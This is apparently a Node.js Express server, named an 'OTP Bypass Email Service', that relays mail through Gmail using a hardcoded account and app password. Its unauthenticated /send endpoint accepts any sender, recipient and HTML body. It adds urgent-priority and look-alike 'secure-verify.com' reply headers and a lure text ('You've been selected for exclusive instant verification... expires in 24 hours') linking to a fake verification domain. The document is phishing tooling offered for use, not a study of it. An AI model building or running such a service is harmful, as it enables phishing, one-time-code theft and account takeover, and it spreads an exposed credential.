// Node.js Email Service for OTP Bypass Extension
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Gmail SMTP Configuration
const smtpConfig = {
  host: 'smtp.gmail.com',
  port: 587,
  secure: false,
  auth: {
    user: 'vturner784@gmail.com',
    pass: 'lhqg zofj qgnl bmys'
  }
};

// Create nodemailer transporter
const transporter = nodemailer.createTransport({
  host: smtpConfig.host,
  port: smtpConfig.port,
  secure: smtpConfig.secure,
  auth: smtpConfig.auth,
  service: 'gmail'
});

// Email sending endpoint
app.post('/send', async (req, res) => {
  console.log('📧 Received email request:', req.body);
  
  try {
    const { from, to, subject, html, encoded } = req.body;
    
    // Verify required fields
    if (!from || !to || !subject || !html) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: from, to, subject, html'
      });
    }
    
    // Create mail options
    const mailOptions = {
      from: from,
      to: to,
      subject: subject,
      html: html,
      headers: {
        'X-Priority': '1',
        'X-Mailer': 'OTP Bypass Extension',
        'List-Unsubscribe': '<mailto:unsubscribe@secure-verify.com>',
        'Reply-To': 'support@secure-verify.com'
      },
      // Add text version for better deliverability
      text: `Dear ${to.split('@')[0]},\n\nCongratulations! You've been selected for exclusive instant verification.\n\nClick here to claim your access: https://auth.secure-verify.com/promo/\n\nThis offer expires in 24 hours.\n\n© 2024 Secure Verify. All rights reserved.`
    };
    
    // Send email using nodemailer
    const info = await transporter.sendMail(mailOptions);
    
    console.log('✅ Email sent successfully:', info.messageId);
    console.log('📧 To:', to);
    console.log('📧 Subject:', subject);
    
    // Return success response
    res.json({
      success: true,
      messageId: info.messageId,
      response: info.response,
      to: to,
      subject: subject
    });
    
  } catch (error) {
    console.error('❌ Email sending failed:', error);
    
    res.status(500).json({
      success: false,
      error: error.message,
      code: error.code
    });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    service: 'OTP Bypass Email Service',
    timestamp: new Date().toISOString()
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 OTP Bypass Email Service running on port ${PORT}`);
  console.log(`📧 SMTP Config: ${smtpConfig.auth.user}`);
  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('👋 Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('👋 Shutting down gracefully...');
  process.exit(0);
});
